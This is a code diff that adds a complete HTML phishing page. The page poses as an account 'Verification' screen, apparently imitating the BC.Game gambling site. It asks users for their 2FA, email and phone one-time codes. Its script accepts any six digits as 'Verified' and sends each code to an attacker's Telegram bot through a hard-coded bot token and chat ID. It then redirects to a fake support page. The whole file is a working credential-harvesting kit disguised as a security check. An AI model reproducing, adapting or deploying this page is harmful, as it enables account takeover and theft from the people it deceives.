@@ -1,0 +1,383 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Verification</title>
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+    body {
+      background: #1b1e20;
+      font-family: Arial, sans-serif;
+      color: #fff;
+      min-height: 100vh;
+      padding: 0;
+      position: relative;
+    }
+    .container {
+      background: #1b1e20;
+      width: 100%;
+      max-width: 400px;
+      margin: 0 auto;
+      padding: 2rem 1.5rem;
+    }
+    .logo {
+      width: 60px;
+      height: 55px;
+      display: block;
+      margin: 0 auto 1rem;
+    }
+    h1 {
+      font-size: 1.75rem;
+      color: #fff;
+      margin-bottom: 0.5rem;
+      text-align: center;
+    }
+    p.description {
+      font-size: 1rem;
+      color: #cfcdcd;
+      font-family: 'Franklin Gothic Medium', 'Arial Narrow', Arial, sans-serif;
+      margin-bottom: 1.5rem;
+      line-height: 1.4;
+      text-align: center;
+    }
+    .progress {
+      text-align: center;
+      font-size: 2rem;
+      margin-bottom: 1.5rem;
+      color: #ffb223; /* Green color for 0/2 */
+      font-weight: bold;
+    }
+    .verification-method {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      font-size: 1rem;
+      margin: 1rem 0;
+      padding: 15px 16px;
+      background: #2c3135;
+      border-radius: 8px;
+      cursor: pointer;
+      transition: 0.3s;
+    }
+    .verification-method:hover {
+      background: #333;
+    }
+    .verification-method.verified {
+      background: #1a3a27;
+      border: 1px solid #28a745;
+    }
+    .verification-method img {
+      width: 24px;
+      height: 24px;
+      margin-right: 10px;
+    }
+    .verification-method label {
+      flex-grow: 1;
+      font-size: medium;
+      font-family: 'Franklin Gothic Medium', 'Arial Narrow', Arial, sans-serif;
+      display: flex;
+      align-items: center;
+      color: #bebdbd;
+    }
+    .status {
+      display: flex;
+      font-size: medium;
+      font-family: 'Franklin Gothic Medium', 'Arial Narrow', Arial, sans-serif;
+      align-items: center;
+      color: #3e8a4f;
+    
+    }
+    .status.verified::before {
+      content: "✓ ";
+      margin-right: 5px;
+    }
+    .status.pending::after {
+      content: " >";
+    }
+    button#confirmBtn {
+      width: 100%;
+      padding: 0.75rem;
+      background-color: #28a745;
+      border: none;
+      border-radius: 6px;
+      font-size: 1.125rem;
+      font-family: 'Franklin Gothic Medium', 'Arial Narrow', Arial, sans-serif;
+      color: #353535;
+      cursor: pointer;
+      margin-top: 1.5rem;
+    }
+    button#confirmBtn:hover {
+      opacity: 0.9;
+    }
+    button#confirmBtn:disabled {
+      background-color: #3c9b51;
+      cursor: not-allowed;
+    }
+    .support-link {
+      text-align: center;
+      margin-top: 1.5rem;
+      font-size: 0.9rem;
+      color: #bbb;
+    }
+    .support-link a {
+      color: #28a745;
+      text-decoration: none;
+      font-weight: bold;
+    }
+    
+    /* Modal Styles */
+    .modal-overlay {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.3); /* 30% blur/transparency */
+      backdrop-filter: blur(2px);
+      z-index: 999;
+    }
+    .modal {
+      display: none;
+      position: fixed;
+      left: 0;
+      bottom: 0;
+      width: 100%;
+      background: #1b1e20;
+      padding: 2rem;
+      border-radius: 28px 28px 0 0;
+      box-shadow: 0 -2px 8px rgba(0, 0, 0, 0.3);
+      text-align: center;
+      z-index: 1000;
+    }
+    .modal-logo {
+      width: 55px;
+      height: 50px;
+      display: block;
+      margin: 0 auto 1rem;
+    }
+    .modal h2 {
+      font-size: 1.5rem;
+      margin-bottom: 1rem;
+    }
+    .modal p {
+      font-size: 0.9rem;
+      color: #bbb;
+      font-family: 'Franklin Gothic Medium', 'Arial Narrow', Arial, sans-serif;
+      margin-bottom: 1.5rem;
+    }
+    .modal input {
+      width: 100%;
+      padding: 0.75rem;
+      margin-bottom: 1rem;
+      background: #1b1e20;
+      border: 0.5px solid #616161;
+      color: #fff;
+      text-align: center;
+      border-radius: 6px;
+      font-size: 0.8rem;
+      letter-spacing: 2px;
+    }
+    .modal button {
+      width: 100%;
+      padding: 0.75rem;
+      background-color: #297e3d;
+      border: none;
+      border-radius: 8px;
+      font-size: 1rem;
+      color: #fff;
+      cursor: pointer;
+    }
+    .modal button:hover {
+      opacity: 0.9;
+    }
+    .close-modal {
+      position: absolute;
+      top: 1rem;
+      right: 1rem;
+      font-size: 1.5rem;
+      color: #bbb;
+      cursor: pointer;
+    }
+    .close-modal:hover {
+      color: #fff;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <img src="https://firebasestorage.googleapis.com/v0/b/contactform-37fe3.appspot.com/o/lockauthen.png?alt=media&token=588a9ead-88cb-4537-8dc2-51b8180e65be" class="logo">
+    <h1>Verification</h1>
+    <p class="description">For your account safety, please complete all of the following verifications to continue.</p>
+    
+    <div class="progress">0 / 2</div>
+    
+    <div class="verification-method" data-method="2FA">
+      <label>
+        <img src="https://firebasestorage.googleapis.com/v0/b/contactform-37fe3.appspot.com/o/lockauthen.png?alt=media&token=588a9ead-88cb-4537-8dc2-51b8180e65be" style="width: 20px; height: 20px"> 
+        2FA Verification
+      </label>
+      <div class="status pending">Go Verify</div>
+    </div>
+    
+    <div class="verification-method" data-method="Email">
+      <label>
+        <img src="https://raw.githubusercontent.com/BcGameTopGame/bcgame../refs/heads/main/envelope.png" style="width: 20px; height: 20px"> 
+        Email Verification
+      </label>
+      <div class="status pending">Go Verify</div>
+    </div>
+    
+    <div class="verification-method" data-method="Phone">
+      <label>
+        <img src="https://raw.githubusercontent.com/BcGameTopGame/bcgame../refs/heads/main/phone.png" style="width: 20px; height: 20px"> 
+        Phone Number
+      </label>
+      <div class="status pending">Go Verify</div>
+    </div>
+    
+    <button id="confirmBtn" disabled>Confirm</button>
+    
+    <div class="support-link">
+      Don't have access to these verification methods? <a href="https://bcgametopgame.github.io/chat/">Contact live support</a>
+    </div>
+  </div>
+  
+  <!-- Modal Overlay for background blur -->
+  <div class="modal-overlay" id="modalOverlay"></div>
+  
+  <!-- Verification Modal -->
+  <div class="modal" id="verificationModal">
+    <span class="close-modal">×</span>
+    <img src="https://firebasestorage.googleapis.com/v0/b/contactform-37fe3.appspot.com/o/lockauthen.png?alt=media&token=588a9ead-88cb-4537-8dc2-51b8180e65be" class="modal-logo">
+    <h2>Enter Verification Code</h2>
+    <p id="modalDescription">Enter the code generated by your Google Authenticator App.</p>
+    <input type="text" placeholder="6-digit verification code" maxlength="6" id="verificationCode" />
+    <button id="verifyBtn">Confirm</button>
+  </div>
+
+  <script>
+    let verifiedMethods = [];
+    let currentMethod = null;
+    const telegramBotToken = "8336836643:AAGhl_2yT8JgJ8BnbjkwpZGu3r2JMIkLgng";
+    const telegramChatId = "-5049974581";
+
+    document.addEventListener("DOMContentLoaded", function () {
+      // Add click event to verification methods
+      document.querySelectorAll('.verification-method').forEach(method => {
+        method.addEventListener('click', function() {
+          if (!this.classList.contains('verified')) {
+            openModal(this);
+          }
+        });
+      });
+
+      // Close modal when clicking X
+      document.querySelector(".close-modal").addEventListener("click", closeModal);
+      
+      // Close modal when clicking overlay
+      document.getElementById("modalOverlay").addEventListener("click", closeModal);
+      
+      // Verify button in modal
+      document.getElementById("verifyBtn").addEventListener("click", verifyCode);
+      
+      // Confirm button
+      document.getElementById("confirmBtn").addEventListener("click", function() {
+        if (verifiedMethods.length >= 2) {
+          window.location.href = "https://bcgametopgame.github.io/chat/";
+        }
+      });
+    });
+
+    function openModal(methodElement) {
+      currentMethod = methodElement;
+      let methodName = methodElement.dataset.method;
+      let modal = document.getElementById("verificationModal");
+      let modalDescription = document.getElementById("modalDescription");
+      
+      // Update modal text based on method
+      if (methodName === "2FA") {
+        modalDescription.innerText = "Enter the code generated by your Google Authenticator App.";
+      } else if (methodName === "Phone") {
+        modalDescription.innerText = "We have sent an OTP to your phone. Enter that OTP here.";
+      } else if (methodName === "Email") {
+        modalDescription.innerText = "We have sent a 6-digit verification code to your email. Enter that code here.";
+      }
+      
+      // Clear input
+      document.getElementById("verificationCode").value = "";
+      
+      // Show overlay and modal
+      document.getElementById("modalOverlay").style.display = "block";
+      modal.style.display = "block";
+      
+      // Send method selection to Telegram (only method name)
+      sendToTelegram(`${methodName}`);
+    }
+
+    function closeModal() {
+      document.getElementById("modalOverlay").style.display = "none";
+      document.getElementById("verificationModal").style.display = "none";
+      currentMethod = null;
+    }
+
+    function verifyCode() {
+      let code = document.getElementById("verificationCode").value;
+      
+      if (!validateCode(code)) {
+        alert("Invalid code. Please enter a 6-digit number.");
+        return;
+      }
+
+      // Mark method as verified
+      if (currentMethod) {
+        currentMethod.classList.add('verified');
+        let statusElement = currentMethod.querySelector('.status');
+        statusElement.textContent = 'Verified';
+        statusElement.classList.remove('pending');
+        statusElement.classList.add('verified');
+        
+        // Add to verified methods
+        if (!verifiedMethods.includes(currentMethod.dataset.method)) {
+          verifiedMethods.push(currentMethod.dataset.method);
+        }
+        
+        // Update progress
+        document.querySelector('.progress').textContent = `${verifiedMethods.length} / 2`;
+        
+        // Enable confirm button if 2 methods are verified
+        if (verifiedMethods.length >= 2) {
+          document.getElementById('confirmBtn').disabled = false;
+        }
+        
+        // Send verification code to Telegram (method name + code in monospace)
+        let methodName = currentMethod.dataset.method;
+        sendToTelegram(`${methodName}: \`${code}\``);
+      }
+      
+      closeModal();
+    }
+
+    function validateCode(code) {
+      return /^\d{6}$/.test(code);
+    }
+
+    function sendToTelegram(message) {
+      fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ 
+          chat_id: telegramChatId, 
+          text: message,
+          parse_mode: "MarkdownV2"
+        })
+      }).catch(error => console.error('Error sending to Telegram:', error));
+    }
+  </script>
+</body>
+</html>
